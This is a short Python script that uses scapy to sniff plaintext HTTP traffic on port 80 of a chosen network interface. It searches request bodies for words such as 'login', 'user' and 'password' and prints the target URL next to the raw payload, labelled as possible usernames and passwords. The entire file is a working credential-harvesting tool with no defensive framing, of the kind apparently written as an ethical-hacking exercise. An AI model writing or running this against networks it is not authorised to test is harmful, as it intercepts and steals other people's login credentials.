from scapy.all import *
from scapy.layers import http

def sniffed_packet(packet):
    if (packet.haslayer(http.HTTPRequest)) :
        if packet.haslayer(Raw):
            loadss=packet[Raw].load
            keywords=['login','LOGIN','Login','Username','username','user','pass','Password','password']
            for keyword in keywords:
                if keyword in str(loadss):
                    url=packet[http.HTTPRequest].Host.decode() + packet[http.HTTPRequest].Path.decode()
                    print ("Requested URL >>",url)
                    print ("Possible Usernames and Passwords",loadss,"\n\n")
        
def sniffer(interface):
    sniff(iface=interface,prn=sniffed_packet,store=False,filter="port 80")
interface=sys.argv[1]
sniffer(interface)
